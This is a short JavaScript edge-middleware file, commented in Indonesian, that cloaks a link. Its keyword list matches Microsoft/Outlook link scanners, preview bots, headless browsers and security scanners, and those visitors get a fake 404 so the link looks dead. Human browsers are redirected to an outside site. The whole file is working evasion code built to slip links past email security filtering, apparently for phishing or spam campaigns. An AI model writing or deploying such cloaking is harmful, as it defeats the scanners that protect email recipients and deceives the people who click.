export default function middleware(req) {
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';

  // Daftar Blocker Bot (Fokus ke Microsoft & Bot Scanner Umum)
  const botKeywords = [
    'bot', 'spider', 'crawler', 'scanner', 
    'outlook', 'office', 'microsoft', 'linkdetect', // Khusus Microsoft/Outlook
    'bing', 'preview', 'headless', 'googleusercontent',
    'lighthouse', 'slurp', 'inspect', 'fetch', 'embed'
  ];

  const isBot = botKeywords.some(keyword => ua.includes(keyword));

  // 1. Jika terdeteksi Bot atau Microsoft Scanner
  if (isBot) {
    // Kita berikan respon 404 agar mereka menganggap link ini rusak/mati
    return new Response('404 Not Found', { 
      status: 404,
      headers: { 'Content-Type': 'text/plain' }
    });
  }

  // 2. Jika Manusia (Pake Browser Asli)
  // Langsung lempar ke web tujuan
  return Response.redirect('https://nusaindahrp.com/?dev', 307);
}
